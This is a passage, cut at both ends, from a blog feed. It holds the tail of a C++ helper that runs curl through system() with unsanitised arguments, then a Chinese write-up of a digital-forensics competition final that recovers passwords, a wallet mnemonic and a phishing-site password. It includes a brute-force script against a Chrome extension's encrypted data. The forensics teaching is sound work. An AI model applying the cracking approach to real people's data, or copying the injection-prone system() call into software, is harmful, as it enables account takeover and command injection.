class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">fclose</span>(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">curlDownload</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path, <span class="type">const</span> <span class="type">char</span>* url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> curlcmd[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">sprintf_s</span>(curlcmd, <span class="built_in">sizeof</span>(curlcmd), <span class="string">&quot;curl -o %s %s&quot;</span>, path, url);</span><br><span class="line">    <span class="built_in">system</span>(curlcmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printc</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">char</span>* style, <span class="type">int</span> ForegroundColor, <span class="type">int</span> BackgroundColor)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> styleStr[<span class="number">50</span>] = <span class="string">&quot;\033[&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> addedStyles[<span class="number">10</span>] = &#123; <span class="literal">false</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (style != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; style[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> styleCode = style[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!addedStyles[styleCode]) &#123;</span><br><span class="line">                len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;%dm;&quot;</span>, styleCode);</span><br><span class="line">                addedStyles[styleCode] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ForegroundColor &lt;= <span class="number">7</span> &amp;&amp; ForegroundColor &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;3%dm;&quot;</span>, ForegroundColor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;%37m;&quot;</span>, ForegroundColor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (BackgroundColor &lt;= <span class="number">7</span> &amp;&amp; BackgroundColor &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;4%dm;&quot;</span>, BackgroundColor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;%40m;&quot;</span>, BackgroundColor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        styleStr[len - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s%s\033[0m\033[1m&quot;</span>, styleStr, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>2025FIC决赛wp</title>
    <url>/2025/10/17/2025FICfinal/</url>
    <content><![CDATA[<blockquote>
<p>好难QAQ</p>
</blockquote>
<span id="more"></span>

<p>1.(填空)请分析检材1，该检材的蓝牙mac地址为 (参考格式:11:22:33:44:55:66) 分值:16</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">([0-9a-fA-F]&#123;2&#125;:)&#123;5&#125;[0-9a-fA-F]&#123;2&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>类型</th>
<th>MAC地址</th>
<th>位置</th>
</tr>
</thead>
<tbody><tr>
<td>WiFi MAC</td>
<td>a4:55:90:12:21:35</td>
<td>data&#x2F;misc&#x2F;apexdata&#x2F;com.android.wifi&#x2F;WifiConfigStore.xml:627</td>
</tr>
<tr>
<td>蓝牙MAC</td>
<td>a4:55:90:15:2e:76</td>
<td>data&#x2F;misc&#x2F;bluedroid&#x2F;bt_config.bak:9</td>
</tr>
</tbody></table>
<p><img src="/2025/10/17/2025FICfinal/image-20251011220250618-1760682882187-1.png" alt="image-20251011220250618">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A4:55:90:15:2E:76</span><br></pre></td></tr></table></figure>

<p>2.(填空)请分析检材1，该检材的系统Linux内核版本号为 (参考格式:1.1.1) 分值:16</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/17/2025FICfinal/image-20251011220710119.png" alt="image-20251011220710119">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.14.186</span><br></pre></td></tr></table></figure>

<p>3.(填空)请分析检材1，该检材中实际使用的密码管理软件的软件包包名为 (参考格式:com.forensix.cn) 分值:19</p>
<p><code>检材1-手机\storage\emulated\0\Android\data</code>​，在此路径中找一下</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251011221213296.png" alt="image-20251011221213296">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">design.codeux.authpass.fdroid</span><br></pre></td></tr></table></figure>

<p>4.(填空)请分析检材1，该检材中密码管理软件的主密钥为 (参考格式:Your answer is right.) 分值:16</p>
<p>在便签里面，<code>检材1-手机\data\user\0\com.miui.notes\databases</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251011223419-fxgt4ry.png" alt="image">​</p>
<p>password for keepass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Save my P Ass.</span><br></pre></td></tr></table></figure>

<p>5.(填空)请分析检材1，该检材中保存的github.com密码为 (参考格式:Abc123) 分值:19</p>
<p>安装Keepass</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012091529-2qrbzia.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Forensix777</span><br></pre></td></tr></table></figure>

<p>6.(填空)请分析检材1，该检材root工具的版本为 (参考格式:1.1) 分值:16</p>
<p>在package.list中查找<code>magisk</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012092308-n55mn42.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">27.0</span><br></pre></td></tr></table></figure>

<p>7.(填空)请分析检材1，找到该手机上的Linux容器，并回答下列问题，该Linux发行版名称为 (参考格式:kali) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012092944-c8d21x5.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">debian</span><br></pre></td></tr></table></figure>

<p>8.(单选)请分析检材1容器，该系统默认桌面环境为 (参考格式:) 分值:19<br>A.KDE<br>B.GNOME<br>C.XFCE<br>D.DDE</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012133142-2akll2c.png" alt="image">​</p>
<p>9.(填空)请分析检材1容器，该系统的android用户密码为 (参考格式:abc123) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012134347-m0swcml.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">99c26da5</span><br></pre></td></tr></table></figure>

<p>10.(填空)请分析检材1容器，浏览器下载的文件名为 (参考格式:1.txt) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012134928-8y0j439.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reshacker_setup.exe</span><br></pre></td></tr></table></figure>

<p>11.(填空)请分析检材1容器，陈某使用过的github代理的域名为 (参考格式:fic.forensix.cn) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012135243-8zo3jwd.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gh.viru.sh</span><br></pre></td></tr></table></figure>

<p>12.(填空)请分析检材1容器中助记词程序recphrase，其使用的壳类型为 (参考格式:VMP) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012142223-y55kq39.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upx</span><br></pre></td></tr></table></figure>

<p>13.(填空)请分析上题程序，程序运行后第2列第3行助记词为 (参考格式:salute) 分值:26</p>
<p><code>recphrase</code>​反编译后入口是reco.pyc</p>
<p>对这个reco.pyc进行反编译，得到字节码反汇编，然后再重构出代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.font_manager <span class="keyword">import</span> FontProperties</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a 4x3 grid of subplots</span></span><br><span class="line">fig, axes = plt.subplots(<span class="number">4</span>, <span class="number">3</span>, figsize=(<span class="number">12</span>, <span class="number">12</span>))</span><br><span class="line">axes = axes.flatten()</span><br><span class="line"><span class="comment"># Word list encoded as ASCII values</span></span><br><span class="line"><span class="comment"># These are the 12 recovery phrase words</span></span><br><span class="line">word_codes_list = [</span><br><span class="line">    [<span class="number">115</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>],  <span class="comment"># &quot;session&quot;</span></span><br><span class="line">    [<span class="number">102</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>],             <span class="comment"># &quot;fever&quot;</span></span><br><span class="line">    [<span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">114</span>],  <span class="comment"># &quot;sponsor&quot;</span></span><br><span class="line">    [<span class="number">99</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">99</span>, <span class="number">104</span>],          <span class="comment"># &quot;crouch&quot;</span></span><br><span class="line">    [<span class="number">116</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>],         <span class="comment"># &quot;ticket&quot;</span></span><br><span class="line">    [<span class="number">116</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">116</span>],             <span class="comment"># &quot;twist&quot;</span></span><br><span class="line">    [<span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>],    <span class="comment"># &quot;approve&quot;</span></span><br><span class="line">    [<span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>],    <span class="comment"># &quot;village&quot;</span></span><br><span class="line">    [<span class="number">102</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">104</span>],        <span class="comment"># &quot;finish&quot;</span></span><br><span class="line">    [<span class="number">115</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">101</span>],         <span class="comment"># &quot;square&quot;</span></span><br><span class="line">    [<span class="number">97</span>, <span class="number">108</span>, <span class="number">115</span>, <span class="number">111</span>],                   <span class="comment"># &quot;also&quot;</span></span><br><span class="line">    [<span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>]                    <span class="comment"># &quot;cook&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># Iterate through each word and display it in a subplot</span></span><br><span class="line"><span class="keyword">for</span> i, word_codes <span class="keyword">in</span> <span class="built_in">enumerate</span>(word_codes_list):</span><br><span class="line">    ax = axes[i]</span><br><span class="line">    <span class="comment"># Set the limits and ticks</span></span><br><span class="line">    ax.set_xlim(<span class="number">0</span>, <span class="built_in">len</span>(word_codes) + <span class="number">1</span>)</span><br><span class="line">    ax.set_ylim(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">    ax.set_xticks([])</span><br><span class="line">    ax.set_yticks([])</span><br><span class="line">    <span class="comment"># Convert ASCII codes to string</span></span><br><span class="line">    word = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(code) <span class="keyword">for</span> code <span class="keyword">in</span> word_codes])</span><br><span class="line">    <span class="comment"># Display the word in the subplot</span></span><br><span class="line">    ax.text(<span class="number">0.5</span>, <span class="number">1.5</span>, word, fontsize=<span class="number">24</span>, ha=<span class="string">&#x27;left&#x27;</span>, va=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line"><span class="comment"># Show the plot</span></span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>这样创建的是一个三列四行的表格，所以第二列第三行应该是第八个，<code>vilage</code>​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">village</span><br></pre></td></tr></table></figure>

<p>14.(填空)请分析上题程序，该组助记词对应的钱包种子前8位为 (参考格式:abc123) 分值:29</p>
<p><a href="https://bip39.dev/zh/">BIP39 助记词转换器</a></p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012162459-8tijbbk.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e08478b0</span><br></pre></td></tr></table></figure>

<p>15.(填空)请分析检材1容器，钓鱼网站（phishing）的后台用户密码加密算法为 (参考格式:aes_sha1) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012163603-57lp173.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pbkdf2_sha256</span><br></pre></td></tr></table></figure>

<p>16.(填空)请分析检材1容器，钓鱼网站超管用户的弱口令为 (参考格式:123456) 分值:26</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123456</span><br></pre></td></tr></table></figure>

<p>17.(填空)请分析检材1容器，宝塔面板的入口为 (参考格式:&#x2F;abc123) 分值:23</p>
<p>一般是在这里<code>/www/server/panel/data/admin_path.pl</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012164851-afrgnw3.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/a2d3e161</span><br></pre></td></tr></table></figure>

<p>18.(填空)请分析检材1容器，宝塔面板运行在aarch64内核时报错的so文件为 (参考格式:a.so) 分值:29</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012165925-n3zc6gv.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PluginLoader.so</span><br></pre></td></tr></table></figure>

<p>19.(填空)请分析检材2，该检材系统中设备名称为neo4chen的系统分区的sha256值为 (参考格式:) 分值:16</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012174307-5664pbu.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E2219548F5A8E61F373258EB658625ADDA7BF858A83AD8D6E4213BCD8ECEB423</span><br></pre></td></tr></table></figure>

<p>20.(填空)请分析检材2，上题系统中，曾被远程控制的ip为 (参考格式:1.1.1.1) 分值:16</p>
<p>搜<code>TerminalServices</code>​或<code>RemoteConnectionManager</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012204113-5gz9ihn.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251012204142-xqjrj9w.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.3.14</span><br></pre></td></tr></table></figure>

<p>21.(填空)请分析检材2加密系统，陈某通过物理方式保存助记词的东西名为 (参考格式:存钱罐) 分值:19</p>
<p>需要把计算机仿真起来</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251013204823-q1cs2rg.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251013205616-d2y5anw.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">时光密钥</span><br></pre></td></tr></table></figure>

<blockquote>
<p> <img src="/2025/10/17/2025FICfinal/image-20251013204945-w7xsjfi.png" alt="image">这还能登上？？？</p>
</blockquote>
<p>22.(填空)请分析检材2加密系统，陈某保存记录完整助记词的文件的md5值为 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251013212553-i49ju25.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251013212624-1r7exip.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251013212659-mq8x9ri.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">635aa992d8513105d3c27c6b9ef373f9</span><br></pre></td></tr></table></figure>

<p>23.(单选)请分析检材2加密系统，陈某交代XI位为2^1，上题文件对应中文助记词不包含一下哪一项 (参考格式:) 分值:23<br>A.摇<br>B.选<br>C.的<br>D.以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="string">&quot;11100111101&quot;</span>, <span class="string">&quot;11000000001&quot;</span>, <span class="string">&quot;11111010110&quot;</span>, <span class="string">&quot;01101010000&quot;</span>, <span class="string">&quot;11000110110&quot;</span>, </span><br><span class="line">       <span class="string">&quot;00000000101&quot;</span>, <span class="string">&quot;10001001000&quot;</span>, <span class="string">&quot;11001111010&quot;</span>, <span class="string">&quot;00001111000&quot;</span>, <span class="string">&quot;00001100001&quot;</span>, </span><br><span class="line">       <span class="string">&quot;00000011001&quot;</span>, <span class="string">&quot;10001011011&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;bip39_chinese_simplified.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> binary <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="built_in">print</span>(lines[(<span class="built_in">int</span>(binary, <span class="number">2</span>)^<span class="number">1988</span>)-<span class="number">1</span>].strip(), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>BIP39 词表的索引规则</p>
<ol>
<li><strong>BIP39 标准编号</strong>：词表中的单词编号是 <strong>1-2048</strong>（从 1 开始）</li>
<li><strong>Python 列表索引</strong>：列表索引是 <strong>0-2047</strong>（从 0 开始）</li>
</ol>
<p>转换逻辑</p>
<p>如果 <code>v^1988</code>​ 的结果代表的是 <strong>BIP39 标准编号</strong>（1-2048），那么：</p>
<ul>
<li>BIP39 编号为 1 的单词 → 在列表中的索引是 0</li>
<li>BIP39 编号为 2048 的单词 → 在列表中的索引是 2047</li>
</ul>
<p>因此需要 <code>-1</code>​ 来转换：<code>lines[(v^1988)-1]</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251013215812-wzn055r.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure>

<p>24.(填空)请分析检材2加密系统，该检材加密系统中陈某自白的录音最后修改时间为 (参考格式:2000-00-00 00:00:00) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251014192157-11m8rt1.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2025-05-14 20:59:20</span><br></pre></td></tr></table></figure>

<p>25.(填空)请分析检材2加密系统，陈某和李某共同出行的户外活动为 (参考格式:摄影) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251014192345-ywqvtss.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">钓鱼</span><br></pre></td></tr></table></figure>

<p>26.(填空)请分析检材2加密系统，陈某自白中的隐藏的“学习资料”所在服务器ip地址为 分值:26</p>
<p>剪映虽然没登录VIP但是好像可以直接用声音分离功能</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251014200600-qljx8e3.png" alt="image">python也可以，就是代码些许复杂，这里就不放出来了，不如直接剪映</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251014200315-f7kx9ge.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">114.51.41.91</span><br></pre></td></tr></table></figure>

<p>27.(填空)请分析检材2加密系统，存放欠条的加密容器文件名为 (参考格式:蜂蜜锅底) 分值:23</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我的手机号</span><br></pre></td></tr></table></figure>

<p>28.(填空)请分析检材2加密系统，该容器欠条中赵某欠陈某多少虚拟币 (参考格式:0.524ETH) 分值:26</p>
<p>密码手机号在初赛里</p>
<p><code>3170010703</code>​，<code>13170010703</code>​，一个普通分区，一个隐藏分区</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251014210707-yl9v0yh.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0.079BTC</span><br></pre></td></tr></table></figure>

<p>29.(填空)请分析检材2加密系统，该检材中ubuntu光盘文件的系统内核版本号为 (参考格式:6.6.6) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251014212411-xrfqkr3.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251014213612-zaiubii.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.15.0</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>30.(单选)请分析检材2Linux系统，该系统的当前状态为 分值:23<br>A.Poweroff(S5)<br>B.Sleep(S2)<br>C.Hibernate(S4)<br>D.Poweron(G0)</p>
<p>找到system.journal</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">journalctl --file system.journal --lines 10</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/17/2025FICfinal/image-20251015100141-vs3p679.png" alt="image">​</p>
<p>‍</p>
<p>31.(填空)请分析检材2Linux系统，该系统使用了什么阵列 (参考格式:zfs1) 分值:19</p>
<p>xw直接看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">raid0</span><br></pre></td></tr></table></figure>

<p>32.(填空)请分析检材2Linux系统，系统自带记事本软件中记录的密码的未知位数有几位 (参考格式:1) 分值:23</p>
<p>Kali默认的应该是<code>mousepad</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015100423-xzvtnf3.png" alt="image">​</p>
<p><code>chrome password : chewhaoN@%d%d%d%d</code>​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>33.(填空)请分析检材2Linux系统，系统自带记事本内容缓存在重组后逻辑分区中的起始偏移地址为 (参考格式:0x0123456789) 分值:26</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015125756-qe0pgy0.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0296D90000</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>34.(填空)请分析检材2Linux系统，chrome浏览器插件的保护密码为 (参考格式:a@1) 分值:26</p>
<p>直接搜<code>/home/haobei/.config/google-chrome/Default</code>​目录下的key字段，找到疑似是密文的部分</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015164547-ysmk0e6.png" alt="image">​</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&quot;crypto-js&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> argon2 = <span class="built_in">require</span>(<span class="string">&quot;argon2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> targetHash = <span class="string">&quot;$argon2id$v=19$m=16384,t=1,p=1$k6EZEDdQYyn+/0GlJtZGpg$hicAuwJorE73Moj+Po2Txda8hyoPPGYa&quot;</span>;</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> password = <span class="string">&quot;chewhaoN@&quot;</span>+<span class="title class_">String</span>(i).<span class="title function_">padStart</span>(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> decryptedWordArray = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(<span class="string">&quot;U2FsdGVkX18Tb9IA8UF4TbpMQjOs4IqZBTIkldDlgn9vw1gIF9ltOirI/lf1SCGh9hAskbnb7cIsoJL6mNii7pQ1SDSt9R7vzF3Y+/d/fPtKXHMisjbQK/U6t+3wREAuoKQ4yZ24iuw+KZ6CW9bl6ULp3nVx0B8QpueW95sw0KOtmOMpmD19nO6gkFvMohcB&quot;</span>, password);</span><br><span class="line">      <span class="keyword">var</span> decryptedHex = decryptedWordArray.<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>); <span class="comment">// 注意这里要用Hex</span></span><br><span class="line">      <span class="keyword">if</span>(decryptedHex)&#123;</span><br><span class="line">        <span class="keyword">const</span> isValid = <span class="keyword">await</span> argon2.<span class="title function_">verify</span>(targetHash, decryptedHex);</span><br><span class="line">        <span class="keyword">if</span>(isValid)&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\n解密成功,密码: <span class="subst">$&#123;password&#125;</span>`</span>);</span><br><span class="line">          process.<span class="title function_">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;未找到&quot;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/17/2025FICfinal/image-20251015165431-ecq0mzi.png" alt="image">​</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">chewhaoN@<span class="number">6087</span></span><br></pre></td></tr></table></figure>

<p>35.(填空)请分析检材2Linux系统，chrome浏览器插件存放的令牌的名称为 (参考格式:abc) 分值:29</p>
<p>还是刚才<code>000003.log</code>​这个文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 令牌记录</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chenhaoren&quot;</span><span class="punctuation">,</span>        <span class="comment">// 账户名</span></span><br><span class="line">    <span class="attr">&quot;encrypted&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>               <span class="comment">// 已加密</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;58384e73-5c98-433d-87bc-165f7f0ddad6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span 